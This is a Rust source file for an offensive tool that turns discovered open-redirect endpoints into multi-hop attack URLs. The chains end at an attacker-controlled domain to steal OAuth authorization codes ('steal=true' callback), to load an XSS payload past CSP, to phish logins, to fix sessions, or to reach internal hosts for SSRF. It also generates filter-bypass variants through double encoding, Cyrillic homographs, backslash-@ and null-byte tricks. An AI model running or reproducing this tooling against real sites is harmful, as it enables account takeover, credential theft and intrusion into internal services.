use std::collections::HashSet;
use std::fmt;

/// Categorizes the exploitation scenario enabled by a redirect chain.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum RedirectChainType {
    /// Steal OAuth authorization codes via redirect_uri manipulation.
    OAuthTokenTheft,
    /// Bounce through open redirect into internal services (SSRF amplification).
    SsrfAmplification,
    /// Chain trusted-domain redirects for convincing phishing URLs.
    PhishingEscalation,
    /// Bypass Content-Security-Policy same-origin restrictions.
    CspBypass,
    /// Redirect after authentication to attacker-controlled page.
    LoginChain,
    /// Generic multi-hop chain with no specialized exploitation goal.
    MultiHop,
}

impl fmt::Display for RedirectChainType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::OAuthTokenTheft => "oauth-token-theft",
            Self::SsrfAmplification => "ssrf-amplification",
            Self::PhishingEscalation => "phishing-escalation",
            Self::CspBypass => "csp-bypass",
            Self::LoginChain => "login-chain",
            Self::MultiHop => "multi-hop",
        };
        write!(f, "{label}")
    }
}

/// Encoding technique applied to redirect URLs to bypass server-side filters.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum BypassEncoding {
    /// Standard percent-encoding of special characters.
    UrlEncoding,
    /// Double percent-encoding: encode already-encoded characters.
    DoubleEncoding,
    /// Protocol-relative URL: `//evil.com` instead of `https://evil.com`.
    ProtocolRelative,
    /// Unicode confusable characters in the domain (homograph attack).
    UnicodeNormalization,
    /// Backslash substitution: `https://trusted.com\@evil.com`.
    BackslashSubstitution,
    /// Null byte injection: `https://trusted.com%00.evil.com`.
    NullByteInjection,
    /// Tab/newline characters to break URL parsers: `https://evil.com%09`.
    WhitespaceInjection,
}

impl BypassEncoding {
    /// Apply this encoding technique to a raw URL string.
    pub fn apply(&self, url: &str) -> String {
        match self {
            Self::UrlEncoding => url_encode(url),
            Self::DoubleEncoding => double_encode(url),
            Self::ProtocolRelative => to_protocol_relative(url),
            Self::UnicodeNormalization => unicode_confusable(url),
            Self::BackslashSubstitution => backslash_substitute(url),
            Self::NullByteInjection => null_byte_inject(url),
            Self::WhitespaceInjection => whitespace_inject(url),
        }
    }

    /// All available bypass techniques.
    pub fn all() -> &'static [BypassEncoding] {
        &[
            Self::UrlEncoding,
            Self::DoubleEncoding,
            Self::ProtocolRelative,
            Self::UnicodeNormalization,
            Self::BackslashSubstitution,
            Self::NullByteInjection,
            Self::WhitespaceInjection,
        ]
    }
}

impl fmt::Display for BypassEncoding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::UrlEncoding => "url-encoding",
            Self::DoubleEncoding => "double-encoding",
            Self::ProtocolRelative => "protocol-relative",
            Self::UnicodeNormalization => "unicode-normalization",
            Self::BackslashSubstitution => "backslash-substitution",
            Self::NullByteInjection => "null-byte-injection",
            Self::WhitespaceInjection => "whitespace-injection",
        };
        write!(f, "{label}")
    }
}

/// A single open redirect endpoint discovered during scanning.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct RedirectEndpoint {
    /// Full URL of the redirect endpoint (e.g., `https://example.com/redirect`).
    pub url: String,
    /// Query parameter that controls the redirect destination.
    pub param_name: String,
    /// Domain this endpoint belongs to.
    pub domain: String,
    /// Whether this endpoint sits on an OAuth callback path.
    pub is_oauth_callback: bool,
    /// Whether this endpoint is behind an authentication wall.
    pub is_authenticated: bool,
}

impl RedirectEndpoint {
    pub fn new(url: &str, param_name: &str, domain: &str) -> Self {
        let is_oauth_callback = url.contains("/oauth")
            || url.contains("/callback")
            || url.contains("/authorize")
            || url.contains("/auth/redirect");
        let is_authenticated = url.contains("/login")
            || url.contains("/auth")
            || url.contains("/session")
            || url.contains("/sso");
        Self {
            url: url.to_string(),
            param_name: param_name.to_string(),
            domain: domain.to_string(),
            is_oauth_callback,
            is_authenticated,
        }
    }
}

/// A constructed multi-hop redirect chain with exploitation metadata.
#[derive(Debug, Clone)]
pub struct RedirectChain {
    /// Ordered sequence of redirect endpoints forming the chain.
    pub hops: Vec<RedirectEndpoint>,
    /// Final destination URL (attacker-controlled target).
    pub final_destination: String,
    /// Exploitation scenario this chain enables.
    pub chain_type: RedirectChainType,
    /// Severity score (0.0-10.0) based on chain length and type.
    pub severity: f64,
    /// Bypass encoding variants that could evade filters on each hop.
    pub bypass_variants: Vec<(usize, BypassEncoding, String)>,
}

impl RedirectChain {
    /// Construct the full chained URL where each hop redirects to the next.
    pub fn build_url(&self) -> String {
        if self.hops.is_empty() {
            return self.final_destination.clone();
        }

        let mut url = self.final_destination.clone();
        for hop in self.hops.iter().rev() {
            let encoded_target = url_encode(&url);
            url = format!("{}?{}={}", hop.url, hop.param_name, encoded_target);
        }
        url
    }

    /// Number of intermediate redirects before reaching the final destination.
    pub fn hop_count(&self) -> usize {
        self.hops.len()
    }
}

/// Builds multi-hop redirect chains from discovered open redirect endpoints.
pub struct RedirectChainBuilder {
    endpoints: Vec<RedirectEndpoint>,
    attacker_domain: String,
    max_hops: usize,
}

impl RedirectChainBuilder {
    pub fn new(attacker_domain: &str) -> Self {
        Self {
            endpoints: Vec::new(),
            attacker_domain: attacker_domain.to_string(),
            max_hops: 3,
        }
    }

    pub fn with_max_hops(mut self, max_hops: usize) -> Self {
        self.max_hops = max_hops;
        self
    }

    pub fn add_endpoint(&mut self, endpoint: RedirectEndpoint) {
        self.endpoints.push(endpoint);
    }

    pub fn add_endpoints(&mut self, endpoints: Vec<RedirectEndpoint>) {
        self.endpoints.extend(endpoints);
    }

    /// Generate all viable multi-hop chains from the registered endpoints.
    /// Produces chains of length 2 through `max_hops` (inclusive).
    pub fn build_all_chains(&self) -> Vec<RedirectChain> {
        let mut chains = Vec::new();
        let final_dest = format!("https://{}/collect", self.attacker_domain);

        for depth in 2..=self.max_hops {
            let mut path: Vec<usize> = Vec::with_capacity(depth);
            self.enumerate_chains(&mut path, depth, &final_dest, &mut chains);
        }

        chains
    }

    /// Generate only OAuth token-theft chains: looks for endpoints on OAuth
    /// callback paths and builds chains terminating at the attacker domain.
    pub fn build_oauth_chains(&self, client_id: &str, scope: &str) -> Vec<RedirectChain> {
        let oauth_endpoints: Vec<&RedirectEndpoint> = self
            .endpoints
            .iter()
            .filter(|ep| ep.is_oauth_callback)
            .collect();

        if oauth_endpoints.is_empty() {
            return Vec::new();
        }

        let mut chains = Vec::new();
        let token_collector = format!("https://{}/oauth/callback?steal=true", self.attacker_domain);

        for oauth_ep in &oauth_endpoints {
            let mut single_hop = self.build_typed_chain(
                vec![(*oauth_ep).clone()],
                &token_collector,
                RedirectChainType::OAuthTokenTheft,
            );
            single_hop.severity = 9.5;

            let auth_url = format!(
                "https://{}/oauth/authorize?client_id={}&redirect_uri={}&scope={}&response_type=code",
                oauth_ep.domain,
                url_encode(client_id),
                url_encode(&single_hop.build_url()),
                url_encode(scope),
            );
            single_hop.final_destination = auth_url;
            chains.push(single_hop);

            for (i, ep) in self.endpoints.iter().enumerate() {
                if ep == *oauth_ep {
                    continue;
                }
                let mut two_hop = self.build_typed_chain(
                    vec![ep.clone(), (*oauth_ep).clone()],
                    &token_collector,
                    RedirectChainType::OAuthTokenTheft,
                );
                two_hop.severity = 9.8;

                let auth_url = format!(
                    "https://{}/oauth/authorize?client_id={}&redirect_uri={}&scope={}&response_type=code",
                    oauth_ep.domain,
                    url_encode(client_id),
                    url_encode(&two_hop.build_url()),
                    url_encode(scope),
                );
                two_hop.final_destination = auth_url;
                chains.push(two_hop);
                let _ = i;
            }
        }

        chains
    }

    /// Generate CSP bypass chains: chain redirects across domains so that
    /// a browser following the redirect chain lands on a disallowed origin
    /// while appearing to originate from an allowed origin.
    pub fn build_csp_chains(&self) -> Vec<RedirectChain> {
        let domains: HashSet<&str> = self.endpoints.iter().map(|ep| ep.domain.as_str()).collect();

        if domains.len() < 2 {
            return Vec::new();
        }

        let mut chains = Vec::new();
        let payload_dest = format!("https://{}/xss-payload.js", self.attacker_domain);

        for src in &self.endpoints {
            for dst in &self.endpoints {
                if src.domain == dst.domain {
                    continue;
                }
                let chain = self.build_typed_chain(
                    vec![src.clone(), dst.clone()],
                    &payload_dest,
                    RedirectChainType::CspBypass,
                );
                chains.push(chain);
            }
        }

        chains
    }

    /// Generate SSRF amplification chains: redirects that bounce from
    /// external-facing endpoints to internal service addresses.
    pub fn build_ssrf_chains(&self, internal_targets: &[String]) -> Vec<RedirectChain> {
        let mut chains = Vec::new();

        for ep in &self.endpoints {
            for target in internal_targets {
                let chain = self.build_typed_chain(
                    vec![ep.clone()],
                    target,
                    RedirectChainType::SsrfAmplification,
                );
                chains.push(chain);
            }

            for ep2 in &self.endpoints {
                if ep == ep2 {
                    continue;
                }
                for target in internal_targets {
                    let chain = self.build_typed_chain(
                        vec![ep.clone(), ep2.clone()],
                        target,
                        RedirectChainType::SsrfAmplification,
                    );
                    chains.push(chain);
                }
            }
        }

        chains
    }

    /// Generate phishing escalation chains: chain trusted-domain redirects
    /// for maximum legitimacy in the browser address bar.
    pub fn build_phishing_chains(&self) -> Vec<RedirectChain> {
        let phish_landing = format!("https://{}/login-page", self.attacker_domain);
        let mut chains = Vec::new();

        for depth in 1..=self.max_hops {
            let mut path: Vec<usize> = Vec::with_capacity(depth);
            self.enumerate_typed_chains(
                &mut path,
                depth,
                &phish_landing,
                RedirectChainType::PhishingEscalation,
                &mut chains,
            );
        }

        for chain in &mut chains {
            chain.severity = match chain.hop_count() {
                1 => 5.0,
                2 => 6.5,
                _ => 7.5,
            };
        }

        chains
    }

    /// Generate login-chain redirect attacks: redirect after authentication
    /// to an attacker-controlled session-fixation page.
    pub fn build_login_chains(&self) -> Vec<RedirectChain> {
        let session_steal = format!("https://{}/session-fixate", self.attacker_domain);
        let auth_endpoints: Vec<&RedirectEndpoint> = self
            .endpoints
            .iter()
            .filter(|ep| ep.is_authenticated)
            .collect();

        let mut chains = Vec::new();

        for auth_ep in &auth_endpoints {
            let mut chain = self.build_typed_chain(
                vec![(*auth_ep).clone()],
                &session_steal,
                RedirectChainType::LoginChain,
            );
            chain.severity = 8.0;
            chains.push(chain);

            for ep in &self.endpoints {
                if ep == *auth_ep {
                    continue;
                }
                let mut chain = self.build_typed_chain(
                    vec![(*auth_ep).clone(), ep.clone()],
                    &session_steal,
                    RedirectChainType::LoginChain,
                );
                chain.severity = 8.5;
                chains.push(chain);
            }
        }

        chains
    }

    /// Generate all bypass encoding variants for each hop in a chain.
    pub fn generate_bypass_variants(
        &self,
        chain: &RedirectChain,
    ) -> Vec<(usize, BypassEncoding, String)> {
        let mut variants = Vec::new();

        for (hop_idx, _hop) in chain.hops.iter().enumerate() {
            let next_url = if hop_idx + 1 < chain.hops.len() {
                chain.hops[hop_idx + 1].url.as_str()
            } else {
                chain.final_destination.as_str()
            };

            for encoding in BypassEncoding::all() {
                let encoded = encoding.apply(next_url);
                variants.push((hop_idx, *encoding, encoded));
            }
        }

        variants
    }

    fn build_typed_chain(
        &self,
        hops: Vec<RedirectEndpoint>,
        final_destination: &str,
        chain_type: RedirectChainType,
    ) -> RedirectChain {
        let hop_count = hops.len();
        let severity = compute_severity(chain_type, hop_count);
        let chain = RedirectChain {
            hops: hops.clone(),
            final_destination: final_destination.to_string(),
            chain_type,
            severity,
            bypass_variants: Vec::new(),
        };
        let bypass_variants = self.generate_bypass_variants(&chain);
        RedirectChain {
            hops,
            final_destination: final_destination.to_string(),
            chain_type,
            severity,
            bypass_variants,
        }
    }

    fn enumerate_chains(
        &self,
        path: &mut Vec<usize>,
        target_depth: usize,
        final_dest: &str,
        results: &mut Vec<RedirectChain>,
    ) {
        if path.len() == target_depth {
            let hops: Vec<RedirectEndpoint> = path
                .iter()
                .map(|&idx| self.endpoints[idx].clone())
                .collect();
            let chain_type = classify_chain(&hops);
            let chain = self.build_typed_chain(hops, final_dest, chain_type);
            results.push(chain);
            return;
        }

        let used: HashSet<usize> = path.iter().copied().collect();
        for i in 0..self.endpoints.len() {
            if used.contains(&i) {
                continue;
            }
            path.push(i);
            self.enumerate_chains(path, target_depth, final_dest, results);
            path.pop();
        }
    }

    fn enumerate_typed_chains(
        &self,
        path: &mut Vec<usize>,
        target_depth: usize,
        final_dest: &str,
        chain_type: RedirectChainType,
        results: &mut Vec<RedirectChain>,
    ) {
        if path.len() == target_depth {
            let hops: Vec<RedirectEndpoint> = path
                .iter()
                .map(|&idx| self.endpoints[idx].clone())
                .collect();
            let chain = self.build_typed_chain(hops, final_dest, chain_type);
            results.push(chain);
            return;
        }

        let used: HashSet<usize> = path.iter().copied().collect();
        for i in 0..self.endpoints.len() {
            if used.contains(&i) {
                continue;
            }
            path.push(i);
            self.enumerate_typed_chains(path, target_depth, final_dest, chain_type, results);
            path.pop();
        }
    }
}

fn classify_chain(hops: &[RedirectEndpoint]) -> RedirectChainType {
    if hops.iter().any(|h| h.is_oauth_callback) {
        return RedirectChainType::OAuthTokenTheft;
    }
    if hops.iter().any(|h| h.is_authenticated) {
        return RedirectChainType::LoginChain;
    }
    let domains: HashSet<&str> = hops.iter().map(|h| h.domain.as_str()).collect();
    if domains.len() > 1 {
        return RedirectChainType::CspBypass;
    }
    RedirectChainType::MultiHop
}

fn compute_severity(chain_type: RedirectChainType, hop_count: usize) -> f64 {
    let base = match chain_type {
        RedirectChainType::OAuthTokenTheft => 9.0,
        RedirectChainType::SsrfAmplification => 8.5,
        RedirectChainType::LoginChain => 7.5,
        RedirectChainType::CspBypass => 7.0,
        RedirectChainType::PhishingEscalation => 5.5,
        RedirectChainType::MultiHop => 4.0,
    };
    let hop_bonus = (hop_count as f64 - 1.0).min(2.0) * 0.5;
    (base + hop_bonus).min(10.0)
}

// --- Bypass encoding implementations ---

fn url_encode(input: &str) -> String {
    let mut encoded = String::with_capacity(input.len() * 3);
    for byte in input.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                encoded.push(byte as char);
            }
            _ => {
                encoded.push_str(&format!("%{:02X}", byte));
            }
        }
    }
    encoded
}

fn double_encode(input: &str) -> String {
    let first_pass = url_encode(input);
    url_encode(&first_pass)
}

fn to_protocol_relative(input: &str) -> String {
    if let Some(rest) = input.strip_prefix("https://") {
        format!("//{rest}")
    } else if let Some(rest) = input.strip_prefix("http://") {
        format!("//{rest}")
    } else {
        input.to_string()
    }
}

fn unicode_confusable(input: &str) -> String {
    input
        .replace('a', "\u{0430}") // Cyrillic а
        .replace('e', "\u{0435}") // Cyrillic е
        .replace('o', "\u{043E}") // Cyrillic о
        .replace('p', "\u{0440}") // Cyrillic р
        .replace('c', "\u{0441}") // Cyrillic с
}

fn backslash_substitute(input: &str) -> String {
    if let Some(rest) = input.strip_prefix("https://") {
        format!("https://trusted.com\\@{rest}")
    } else if let Some(rest) = input.strip_prefix("http://") {
        format!("http://trusted.com\\@{rest}")
    } else {
        format!("trusted.com\\@{input}")
    }
}

fn null_byte_inject(input: &str) -> String {
    if let Some(rest) = input.strip_prefix("https://") {
        format!("https://trusted.com%00.{rest}")
    } else if let Some(rest) = input.strip_prefix("http://") {
        format!("http://trusted.com%00.{rest}")
    } else {
        format!("trusted.com%00.{input}")
    }
}

fn whitespace_inject(input: &str) -> String {
    if let Some(rest) = input.strip_prefix("https://") {
        format!("https://{rest}%09")
    } else if let Some(rest) = input.strip_prefix("http://") {
        format!("http://{rest}%09")
    } else {
        format!("{input}%09")
    }
}
